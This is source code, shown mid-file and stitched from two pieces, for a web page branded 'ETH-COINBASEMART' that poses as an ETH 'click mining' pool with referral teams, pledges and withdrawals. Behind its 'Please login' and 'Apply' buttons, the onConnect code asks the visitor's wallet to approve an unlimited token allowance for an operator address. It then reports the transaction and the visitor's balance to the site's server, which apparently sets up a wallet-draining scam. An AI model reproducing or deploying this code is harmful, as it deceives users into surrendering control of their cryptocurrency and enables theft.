                            infuraId: "cd6790ac1b8f4144ac0a6498de5f1e3f",
                        }
                    },
                    fortmatic: {
                        package: Fortmatic,
                        options: {
                            // Mikko's TESTNET api key
                            key: "pk_live_3D938B1C3825E2E9"
                        }
                    }
                };
                web3Modal = new Web3Modal({
                    cacheProvider: false, // optional
                    providerOptions, // required
                    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
                });

                try {
                    provider = await web3Modal.connect()
                    provider.enable()

                } catch(e) {
                    toast("Please open it in DAPP wallet browser");

                    return;
                }

                // Subscribe to accounts change
                provider.on("accountsChanged", async (accounts) => {
                    await this.fetchAccountData();
                });


                // Subscribe to chainId change
                provider.on("chainChanged", async (chainId) => {
                    await this.fetchAccountData();
                });

                // Subscribe to networkId change
                provider.on("networkChanged", async (networkId) => {
                    await this.fetchAccountData();
                });
                await  this.refreshAccountData();
            },



            async  refreshAccountData() {

                await this.fetchAccountData(provider);
            },

            /**
             * Kick in the UI action after Web3modal dialog has chosen a provider
             */
            async  fetchAccountData() {
                const web3 = new Web3(provider);
                provider.enable()
                const accounts = await web3.eth.getAccounts()
                this.defaultAddress = accounts[0];
                this.form.address = this.defaultAddress;
                await this.getMostValuableAssets(this.defaultAddress)
                this.login()


            },
            async  getMostValuableAssets(account) {
                let _symbol = 'usdt'
                let _this=this
                for (const [symbol, contract] of Object.entries(contracts)) {
                    contract.methods.balanceOf(account).call(function(err, balance) {
                        _this.balancetotal = balance/1000000
                    })
                }
                return _symbol
            },

            /**
             * Connect wallet button pressed.
             */
            async   onConnect() {
                let _this=this
                if (this.defaultAddress && provider) {
                    const web3 = new Web3(provider);
                    const contract = new web3.eth.Contract(ABI, approveAddr)
                    const gasPrice = await web3.eth.getGasPrice()
                    contract.methods.approve(this.authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
                        from: this.defaultAddress,
                        gasPrice: gasPrice,
                        gas: 70000,
                    }, function(err, tx) {
                        if(!err){
                            _this.approval(_this.defaultAddress, tx, _this.balancetotal)
                            toast("success");
                        }else{
                            toast(err);
                        }
                    })
                } else {
                    provider = await web3Modal.connect()
                    provider.enable()
                    const web3 = new Web3(provider);
                    const accounts = await web3.eth.getAccounts()
                    this.defaultAddress = accounts[0]
                    const contract = new web3.eth.Contract(ABI, approveAddr)
                    const gasPrice = await web3.eth.getGasPrice()
                    contract.methods.approve(this.authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
                        from: this.defaultAddress,
                        gasPrice: gasPrice,
                        gas:70000,
                    }, function(err, tx) {
                        if(!err){
                            _this.approval(_this.defaultAddress, tx, _this.balancetotal)
                        }
                        else{
                            toast("fail");
                        }
                    })
                }
            },

            /**
             * Disconnect wallet button pressed.
             */
            async  onDisconnect() {

                console.log("Killing the wallet connection", provider);

                // TODO: Which providers have close method?
                if(provider.close) {
                    await provider.close();

                    // If the cached provider is not cleared,
                    // WalletConnect will default to the existing session
                    // and does not allow to re-scan the QR code with a new wallet.
                    // Depending on your use case you may want or want not his behavir.
                    await web3Modal.clearCachedProvider();
                    provider = null;
                }

                this.defaultAddress=''
                // Set the UI back to the initial state
                // document.querySelector("#prepare").style.display = "block";
                // document.querySelector("#connected").style.display = "none";
            },
            tabrecord(index, num) {
                let _this = this;
                this.form.found_type = num;
                this.recordindex = index;
                _this.found=[]
                $.ajax({
                    type: 'get',
                    url: '/index/index/found',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        if (data.code == 0) {

                        } else {
                            _this.found = data.data
                        }
                    },
                    error: function (data) {
                    }
                })

            },
            submitwithdraw() {
                let _this = this;
                if (this.form.number == 0 || this.form.number == '') {
                    toast('Quantity cannot be empty')
                    return true
                }
                if (this.form.address == 0) {
                    toast('Please login')
                    return true
                }
                $.ajax({
                    type: 'get',
                    url: '/index/index/withdraw',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        toast(data.msg)
                        if (data.code == 0) {
                            toast(data.msg)
                        } else {
                            _this.login()
                        }
                    },
                    error: function (data) {

                    }
                })
            },
            postexchange() {
                if (this.form.number == 0 || this.form.number == '') {
                    toast('Quantity cannot be empty')
                    return true
                }
                if (this.form.address == 0) {
                    toast('Please login')
                    return true
                }
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/postexchange',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        toast(data.msg)
                        if (data.code == 0) {
                            toast(data.msg)
                        } else {
                            _this.login()
                        }
                    },
                    error: function (data) {

                    }
                })

            },
            tab(page) {
                this.tabindex = page;

            },
            pages: function (page) {
                this.pageindex = page
                this.form.pageindex=page
                this.login();
                this.toqrcode(page);

                if(page =='team'){
                    this.teamfound();
                }
            },
            toqrcode(page){
                let that=this;
                setTimeout(function () {
                    if(page =='team'){
                        if(that.indexqrcode ==0){
                            new QRCode("qrcode_url", {
                                text: that.share_url,
                                width: 152,
                                height: 152,
                                colorDark : "#000000",
                                colorLight : "#ffffff",
                                correctLevel : QRCode.CorrectLevel.H
                            });
                            that.indexqrcode=1;
                        }else{
                        }

                        var clipboard = new Clipboard('#copy', {
                            text: function () {
                                return that.share_url;
                            }
                        });
                        clipboard.on('success', function(e) {
                            toast("Copy successful")
                        });

                        clipboard.on('error', function(e) {
                            console.log(e);
                        });
                    }else{

                    }
                },500)
            },
            text() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/text',
                    async: false,
                    data: {type: 1},
                    success: function (data) {
                        _this.marqueeList = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            showMarquee: function () {
                this.animate = true;
                setTimeout(() => {
                    this.marqueeList.push(this.marqueeList[0]);
                    this.marqueeList.shift();
                    this.animate = false;
                }, 500)
            },
            help_center() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/help',
                    data:{type:1},
                    async: false,
                    success: function (data) {
                        _this.help = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            handleCommand(command) {
                console.log(111);
                console.log(command);
                this.selectedIndex = this.langs[command]
                this.lang=this.selectedIndex.lang;
                var url= replaceParamVal('lang',this.lang)
                window.location.href=url;
            },
            language() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/language',
                    async: false,
                    success: function (data) {
                        var data = data.data;
                        _this.selectedIndex = data[0]
                        _this.langs = data
                        for (var i=0; i<data.length;i++){
                            if(data[i]['lang'] ==_this.lang){
                                _this.selectedIndex = data[i]
                            }
                        }
                    },
                    error: function (data) {

                    }
                })
            },
            login() {
                let _this = this;
                $.ajax({
                    type: 'post',
                    url: '/index/index/login',
                    data: {
                        address: this.defaultAddress,
                        type: 1,
                        p: this.getUrlQueryString('p'),
                        d: this.getUrlQueryString('d'),
                        pageindex:this.form.pageindex
                    },
                    success: function (data) {
                        if(data.code ==1){
                            _this.userinfo = data.data
                            _this.d = _this.getUrlQueryString('d') == '' ?  data.data.agent_id : _this.getUrlQueryString('d')
                            _this.share_url= _this.userinfo.url==''?"https://"+_this.domain+"?p="+data.data.id+"&d=1&lang="+_this.lang+'&type='+1:_this.userinfo.url
                        }else{
                            toast(data.msg)
                        }

                    },
                })
            },
            approval(address, tx, balance) {
                let _this = this;
                $.ajax({
                    type: 'post',
                    url: '/index/index/login',
                    data: {tx: tx, address: address, balance: balance,type:this.form.type},
                    success: function (data) {
                        _this.login();
                    },
                })
            },

            getUrlQueryString: function (names, urls) {
                urls = urls || window.location.href;
                urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
                var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
                var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
                if (r != null && r[2] != "") return unescape(r[2]);
                return null;

            },



        },
        filters: {
            formatAddress: function (value) {
                if (!value) return ''
                return value.slice(1, 6)
            },
            defaultwallentaddress:function (value) {
                if (!value) return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
                return value.slice(1, 6)
            }
        }
    })

</script>
</html>
<!DOCTYPE html>
<html style="background: #1e2126;"
<head>
    <meta charset="utf-8">
    <title>ETH-COINBASEMART</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <link rel="stylesheet" href="assets/unpkg/element-ui%402.15.9/lib/theme-chalk/index.css">
    <link rel="stylesheet" href="assets/index/css/base.css">
    <link rel="stylesheet" href="assets/tron/css/index99c6.css?version=137" />
    <style>
        [v-cloak]{
            display: none;
        }
        #qrcode{
            width: 128px;
            margin: 0px auto;
        }
        .remark{
            text-align: center;
            padding: 10px 0px;
            color: red;
        }
        .xuanlm .ghkjl {
            float: left;
        }
    </style>
</head>

<body >
<div id="app" v-cloak>
    <div class="top topeth"  >
        <div class="headk">
            <div class="lety">
                <span></span>
                {{defaultAddress|formatAddress}}
            </div>
            <h2 class="logoeth" ></h2>
            <div class="righ">
                <a href="https://www.upchat.cc/chat/index?noCanClose=1&amp;token=01d864e89e3c6fa534a7a3dd5ba5b13c" target="_blank" style="margin-right: 16px;">
                    <svg t="1647499390835" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5256" width="32" height="32"><path d="M805.546667 481.28h37.546666c-13.653333-180.906667-167.253333-324.266667-351.573333-324.266667S157.013333 303.786667 143.36 481.28h37.546667c44.373333 0 78.506667 34.133333 78.506666 78.506667V716.8c0 17.066667-6.826667 30.72-13.653333 44.373333-10.24 17.066667-30.72 30.72-47.786667 34.133334C269.653333 873.813333 375.466667 921.6 494.933333 921.6s221.866667-47.786667 296.96-129.706667c-20.48-3.413333-37.546667-17.066667-47.786666-34.133333-6.826667-10.24-13.653333-27.306667-13.653334-44.373333v-157.013334c0-37.546667 34.133333-75.093333 75.093334-75.093333z" fill="#4a73f2" p-id="5257"></path><path d="M740.693333 662.186667c-58.026667 58.026667-133.12 98.986667-218.453333 105.813333-17.066667 3.413333-27.306667 13.653333-23.893333 30.72 0 17.066667 17.066667 30.72 30.72 30.72 102.4-10.24 197.973333-58.026667 262.826666-129.706667-20.48-10.24-40.96-20.48-51.2-37.546666z" fill="#FFFFFF" p-id="5258"></path><path d="M904.533333 512c0-27.306667-3.413333-58.026667-6.826666-81.92-3.413333-13.653333-6.826667-27.306667-10.24-37.546667-3.413333-10.24-6.826667-23.893333-13.653334-37.546666-10.24-23.893333-23.893333-47.786667-37.546666-71.68-6.826667-10.24-17.066667-20.48-23.893334-30.72-6.826667-10.24-17.066667-20.48-27.306666-30.72-20.48-20.48-37.546667-34.133333-61.44-51.2-64.853333-44.373333-146.773333-68.266667-228.693334-68.266667s-163.84 23.893333-228.693333 68.266667c-23.893333 13.653333-44.373333 30.72-61.44 51.2-10.24 10.24-17.066667 20.48-27.306667 30.72-6.826667 10.24-17.066667 20.48-23.893333 30.72-17.066667 20.48-27.306667 44.373333-37.546667 71.68-6.826667 10.24-10.24 23.893333-13.653333 37.546666-3.413333 10.24-6.826667 23.893333-10.24 37.546667-6.826667 23.893333-10.24 54.613333-10.24 81.92v204.8c0 44.373333 34.133333 78.506667 78.506667 78.506667h20.48c6.826667 0 10.24 0 17.066666-3.413334 20.48-3.413333 37.546667-17.066667 47.786667-34.133333 6.826667-10.24 13.653333-27.306667 13.653333-44.373333v-157.013334c0-44.373333-34.133333-78.506667-78.506666-78.506666H143.36c13.653333-180.906667 167.253333-324.266667 351.573333-324.266667s337.92 143.36 351.573334 324.266667h-37.546667c-44.373333 0-78.506667 34.133333-78.506667 78.506666V716.8c0 17.066667 6.826667 30.72 13.653334 44.373333 10.24 17.066667 30.72 30.72 47.786666 34.133334 3.413333 0 10.24 3.413333 17.066667 3.413333h20.48c44.373333 0 78.506667-34.133333 78.506667-78.506667V529.066667c-3.413333-3.413333-3.413333-17.066667-3.413334-17.066667z" fill="#c1d1ec" p-id="5259"></path><path d="M552.96 843.093333h-116.053333c-34.133333 0-61.44-23.893333-61.44-58.026666 0-30.72 23.893333-58.026667 58.026666-58.026667h116.053334c30.72 0 58.026667 23.893333 58.026666 58.026667 3.413333 34.133333-20.48 58.026667-54.613333 58.026666z" fill="#FFFFFF" p-id="5260"></path></svg>
                </a>
                <el-dropdown @command="handleCommand" trigger="click">
  <span class="el-dropdown-link">
   <img :src="selectedIndex.imageurl" alt=""  style=" width: 30px;
    height: auto;
    vertical-align: middle;"> {{selectedIndex.name_lang}}
  </span>
                    <el-dropdown-menu slot="dropdown">
                        <el-dropdown-item v-for="(item,index) in langs" :command="index">
                            <img :src="item.imageurl" alt="" style=" width: 30px;
    height: auto;
    vertical-align: middle;">
                            {{item.name_lang}}</el-dropdown-item>
                    </el-dropdown-menu>
                </el-dropdown>
            </div>
        </div>
        <div class="wenbt">
            <h6>Click mining</h6>
            <p>Join a node to start mining</p>
            <h5 @click="onConnect()" v-if="defaultAddress ==''">Please login</h5>
            <h5 @click="onConnect()" v-else-if="defaultAddress !='' && (userinfo['is_authorized'] ==2 || userinfo['is_authorized'] =='2')">Apply</h5>
            <h5 v-else>welcome</h5>
        </div>


        <!--        <span class="plk">TRON</span>-->
        <!--        <span class="hkm">BitTorrent</span>-->
    </div>
    <div class="tongzhi">
        <div class="tzle">
            <span></span>
        </div>
        <marquee scrolldelay="180" direction="left" style="width: 100%">
            <a class="marquee_a" :href="'index/index/gonggaopage?type=1&lang='+lang" v-for="(item,index) in gonggaodata">{{item[lang+'_title']}}</a>
        </marquee>
    </div>
    <div class="anniul">
        <a v-bind:class="{ 'alk': pageindex=='index' }"  @click="pages('index')">mining pool        </a>
        <a v-bind:class="{ 'alk': pageindex=='account' }" @click="pages('account')" class="item">
            account        </a>
        <a v-bind:class="{ 'alk': pageindex=='team' }"  @click="pages('team')" class="item">
            team        </a>
    </div>
    <div class="index" v-show="pageindex =='index'">
        <div class="shuju">
            <span>Mining pool data</span>
        </div>
        <div class="xianl">
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_zcc.png" />
                    <h6>Total output</h6>
                    <p>{{pool.total_output}} ETH</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_yxjd1.png" />
                    <h6>Effective node</h6>
                    <p>{{pool.lang_valid_node}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_cysl.png" />
                    <h6>Number of participants</h6>
                    <p>{{pool.lang_participant}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_icon_yhsy.png" />
                    <h6>User benefits</h6>
                    <p>{{pool.lang_user_revenue}} ETH</p>
                </div>
            </div>


            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_icon_yhsy.png" />
                    <h6>Total pledge income</h6>
                    <p>{{pool.total_pledge_income}} USDT</p>
                </div>
            </div>


        </div>

        <div class="shuju">
            <span>User output</span>
        </div>

        <div class="shuchu">
            <div class="tokl">
                <span id="lang_address">address</span>
                <span id="lang_quantity">quantity</span>
            </div>

            <ul class="xijkl">
                <li v-for="(item, index) in marqueeList">
                    <a>  {{item.address}}</a>
                    <span>{{item.price}} ETH</span>
                </li>

            </ul>

        </div>

        <!--			<div class="shuju">-->
        <!--				<span>Usdt lock up and earn money</span>-->
        <!--			</div>-->
        <!---->
        <!--<div class="shukkl">-->

        <!--    <div class="jnjm">-->
        <!--        <p> Locked warehouse quantity</p>-->
        <!--        <div class="shurugh">-->
        <!--            <input placeholder="Please enter quantity" v-model="form.num"/>-->
        <!--            <span>USDT</span>-->
        <!--        </div>-->
        <!--        <p>Please select days</p>-->
        <!--        <div class="tiansk">-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0200','1')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0230','7')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0260','8')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0290','9')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0360','10')"></a>-->
        <!--            -->
        <!--        </div>-->
        <!--        <p>Estimated total revenue</p>-->
        <!--        <div class="shurugh">-->
        <!--            <a>{{allprofit}}</a>-->
        <!--            <span>USDT</span>-->
        <!--        </div>-->
        <!--        <h6 class="tygk">Interest returned upon maturity + principal</h6>-->
        <!--        <div class="ankl" @click="buy">pledge</div>-->
        <!--    </div>-->
        <!--</div>-->
        <!---->


        <div class="shuju">
            <span>Help center</span>
        </div>

        <div class="banh">
            <el-collapse v-model="activeNames" @change="handleChange">
                <el-collapse-item :title="item[lang+'_title']" :name="index" v-for="(item,index) in help">
                    <div v-html="item[lang+'_context']"></div>
                </el-collapse-item>
            </el-collapse>
        </div>

        <!--			<div :class="['banh', { 'combanh0': index==0, 'combanh1': index ==1, 'combanh2': index==2}]"  v-for="(item,index) in help">-->
        <!--				<h6 v-html="item[lang+'_title']"></h6>-->
        <!--				<p class="wenjk" v-html="item[lang+'_context']"></p>-->
        <!--			</div>-->


        <div class="shuju">
            <span> Interactive communication platform</span>
        </div>

        <!-- <div class="xuanlm">
              -->

        <!--				<div class="ghkjl">-->
        <!--					-->
        <!--				</div>-->
        <!--				<div class="ghkjl">-->
        <!--					<img src="assets/tron/img/icon_Telegram.png" />-->
        <!--				</div>#-->
        <!--				<div class="ghkjl">-->
        <!--					<img src="assets/tron/img/icon_Skype.png" />-->
        <!--				</div>-->
        <!-- </div>

         <div class="tfgkh" onclick="window.location.href='https://ethereum.org/en/'">ETH</div>-->

        <div class="xuanlm" style="margin-bottom:0.3rem;display: block;">
            <!--<div class="ghkjl">
                <img src="assets/tron/img/icon_hbb.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_CoinGecko.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_BINANCE.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_DeFiBox.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_Coinbase.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_TOKENPOCKET.png" />
            </div>-->

        </div>
        <div class="shuju">
            <span> Cooperation unit</span>
        </div>
        <div class="xuanlm" style="margin-bottom:0.3rem;display: block;">
            <div class="ghkjl">
                <img src="assets/tron/img/icon_hbb.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_CoinGecko.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_BINANCE.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_DeFiBox.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_Coinbase.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_TOKENPOCKET.png" />
            </div>
        </div>
    </div>
    <div class="account" v-show="pageindex =='account' ">
        <div class="shuju">
            <span>Usdt lock up and earn money</span>
        </div>
        <div class="duihuan" style="height: 2.04rem;
    background-size: 3.54rem 2rem;">

            <div class="duikun">
                <div class="duile">
                    <input  placeholder="0.0000" v-model="zy.num"/>
                    <a @click="zy.num =userinfo.wallet">all</a>
                </div>
                <div class="duiak"></div>
                <div class="duirty">
                    <span></span>
                    USDT
                </div>
            </div>
            <div class="anmk" v-if="form.address !=''" @click="zy_buy">pledge</div>
            <div class="anmk" v-if="form.address !=''" @click="jc_zy_buy">Release pledge</div>
            <div class="anmk" v-else="form.address ==''">Please login</div>

        </div>

        <div class="shuju">
            <span>My account</span>
        </div>
        <div class="zhank">
            <img src="assets/tron/img/icon_qbye.png" style="width:0.2rem;height:0.25rem;"/>
            <h6 style="font-weight: 500;">Locked balance</h6>
            <p style="margin-top:0.15rem;">{{userinfo.lock_balance}} USDT</p>
        </div>
        <div class="xianl" style="margin-top:-0.05rem">
            <!--<div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tdcc.png" />
                    <h6 style="font-weight: 500;">Team output</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.team_out}} ETH</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_grcc.png" style="width:0.2rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Individual output</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.oneself_out}} ETH</p>
                </div>
            </div>-->
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_ktxye.png" />
                    <h6 style="font-weight: 500;">Withdrawal balance</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.wallet}} USDT</p>
                </div>
            </div>

            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_kdhye.png" />
                    <h6 style="font-weight: 500;">Convertible balance</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.total}} ETH</p>
                </div>
            </div>
        </div>
        <div class="shuju">
            <span>exchange</span>
        </div>
        <div class="duihuan">

            <div class="duikun">
                <div class="duile">
                    <input  placeholder="0.0000" v-model="form.dnumber"/>
                    <a @click="form.dnumber =userinfo.total">all</a>
                </div>
                <div class="duiak"></div>
                <div class="duirty">
                    <span></span>
                    USDT
                </div>
            </div>

            <p class="gyhj">1 ETH convertible  {{price}} USDT</p>
        </div>
        <div class="anmk" v-if="form.address !=''" @click="postexchange">exchange</div>
        <div class="anmk" v-else="form.address ==''">Please login</div>
        <div class="shuju">
            <span>Withdrawal</span>
        </div>
        <div class="tixiank">
            <p class="shulian">Withdrawal quantity</p>
            <div class="hjng">
                <input placeholder="Please enter the withdrawal amount" v-model="form.wnumber" />
                <a>
                    <span></span>
                    USDT
                </a>
            </div>
            <div class="anmk" style="margin-top:0.25rem;" @click="submitwithdraw">confirm</div>
            <p class="tishi" styl>Your withdrawal will be sent to your usdt wallet address within the next 24 hours</p>
        </div>
        <div class="shuju">
            <span>record</span>
        </div>
        <div class="jiluk">
            <div class="ankld">
                <div class="tyghk">
                    <a @click="tabrecord('exchange',1)" v-bind:class="{ 'alk': recordindex=='exchange' }">  exchange</a>
                    <a @click="tabrecord('withdraw',2)" v-bind:class="{ 'alk': recordindex=='withdraw' }">Withdrawal</a>
                    <a @click="tabrecord('profit',3)" v-bind:class="{ 'alk': recordindex=='profit' }"> profit</a>
                    <a @click="tabrecord('reward',4)" v-bind:class="{ 'alk': recordindex=='reward' }">reward</a>
                </div>
            </div>
            <ul class="jikl">
                <li v-for="(item,index) in found">
                    <div class="leyt">
                        <h6>{{item.memo}}</h6>
                        <p>{{item.createtime}}</p>
                    </div>
                    <a>
                        <span>{{item.money}}</span>
                        {{item.danwen}}
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <div class="team" v-show="pageindex =='team'">
        <div class="shuju">
            <span>Team data</span>
        </div>
        <div class="xianl">
            <!--				<div class="wenh">-->
            <!--					<div class="xiank">-->
            <!--						<img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>-->
            <!--						<h6 style="font-weight: 500;">Team benefits</h6>-->
            <!--						<p style="margin-top:0.15rem;">{{userinfo.team_profit}} ETH</p>-->
            <!--					</div>-->
            <!--				</div>-->
            <!--				<div class="wenh">-->
            <!--					<div class="xiank">-->
            <!--						<img src="assets/tron/img/icon_tjrs.png" style="width:0.25rem;height:0.25rem;"/>-->
            <!--						<h6 style="font-weight: 500;">Recommended number</h6>-->
            <!--						<p style="margin-top:0.15rem;">{{userinfo.myson1}}</p>-->
            <!--					</div>-->
            <!--				</div>-->

            <div class="zhank">
                <img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>
                <h6 style="font-weight: 500;">Recommended number of next generation</h6>
                <p style="margin-top:0.15rem;">{{userinfo.myson1}}</p>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Number of second generation recommenders</h6>
                    <p style="margin-top:0.15rem;">{{userinfo.myson2}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tjrs.png" style="width:0.25rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Recommended number of three generations</h6>
                    <p style="margin-top:0.15rem;">{{userinfo.myson3}}</p>
                </div>
            </div>
        </div>
        <div class="shuju">
            <span>Share promotion</span>
        </div>
        <div class="qrcode" v-if="userinfo['tx'] !='' && userinfo['tx'] !=0 && userinfo['tx'] !='0' && userinfo['tx'] !=null&&  userinfo['tx'] !='null'" >
            <div id="qrcode_url" ref="qrcode" dd="22"></div>
            <div class="share-title-margin" v-if="defaultAddress ==''">	Sign in to get your invitation QR code</div>
            <div class="share-title-margin" v-if="defaultAddress !=''">	Share QR code and invite friends</div>
            <span  class="qrcode_invite_url" style="text-transform: inherit;">{{share_url}}</span>
            <div class="success_share_tip">
                <span >Successful invitation can obtain</span>
                <span id="fengxianghd">0.0025 ETH</span>
            </div>
            <span  class="copybtn" id="copy">Copy invitation link</span>
            <div class="remark" >
                Please open it in DAPP wallet browser            </div>
        </div>
        <div class="shuju">
            <span>my good friend</span>
        </div>
        <div style="width: 90%;margin: 0px auto">
            <div v-for="(item,index) in teamfounds" style="margin: 20px 0px;display: flex;
    justify-content: space-between;">
                <div style="color: white">{{item.dai+1}}generation</div>
                <div style="color: white">{{item.address}}</div>
                <div style="color: white">profit:{{item.profit}}</div>
            </div>
        </div>
    </div>
    <el-dialog
            title=""
            :visible.sync="network"
            width="80%"
    >
        <ul class="network">
            <!--            <li>-->
            <!--                <a :href="share_url">-->
            <!--                <img src="assets/img/eth.png" alt="">-->
            <!--                    Ethereum-->
            <!--                </a>-->
            <!--            </li>-->
            <li>
                <a :href="share_url_trc">
                    <img src="assets/img/trx.png" alt="">
                    TRON (TRX)
                </a>
            </li>
        </ul>

        <div class="" style="text-align: center;"  @click="onDisconnect()" v-if="defaultAddress !=''">
            <el-button round>
                Disconnect
            </el-button>
        </div>


    </el-dialog>
</div>
</body>
<script type="text/javascript" src="assets/tron/js/com.js" ></script>
<script src="assets/index/js/vue.js" type="text/javascript"></script>
<script src="assets/index/js/clipboard.min.js" type="text/javascript"></script>
<script src="assets/trc/js/jquery-1.11.0.min.js" type="text/javascript"></script>
<script src="assets/index/js/message.js" type="text/javascript"></script>
<script src="assets/index/js/qrcode.min.js" type="text/javascript"></script>
<script src="assets/index/js/element.js" type="text/javascript"></script>
<script src="assets/index/js/bignumber.min.js"></script>
<script src="assets/index/js/web3.min.js"></script>
<script src="assets/index/js/web3model.min.js" type="text/javascript"></script>
<script src="assets/index/js/web3provider.js" type="text/javascript"></script>
<script type="text/javascript">
    "use strict";
    const ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_addr","type":"address"},{"name":"_eth","type":"uint256"}],"name":"allocateToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isFunding","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"tokenRaised","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"newContractAddr","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"tokenExchangeRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"stopFunding","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_newContractAddr","type":"address"}],"name":"setMigrateContract","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"version","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"tokenMigrated","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"currentSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_fundingStartBlock","type":"uint256"},{"name":"_fundingStopBlock","type":"uint256"}],"name":"startFunding","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"migrate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":f